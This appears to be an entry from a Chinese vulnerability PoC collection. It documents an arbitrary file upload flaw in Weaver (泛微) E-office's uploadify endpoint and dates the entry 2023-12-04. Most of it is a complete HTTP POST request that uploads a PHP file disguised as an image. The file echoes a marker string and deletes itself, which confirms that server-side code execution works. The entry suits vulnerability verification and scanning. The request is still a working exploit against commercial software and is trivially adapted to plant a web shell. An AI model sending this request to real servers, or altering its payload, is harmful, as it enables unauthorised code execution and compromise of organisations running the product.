﻿# 泛微 E-office uploadify 任意文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：文件地址：/attachment/返回值/2TrZmO0y0SU34qUcUGHA8EXiDgN.php

> 漏洞特征：

> 验证脚本：HTTP

```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4

--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="2TrZmO0y0SU34qUcUGHA8EXiDgN.php"
Content-Type: image/jpeg

<?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?>
--e64bdf16c554bbc109cecef6451c26a4--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：泛微 E-office uploadify 任意文件上传漏洞.poc
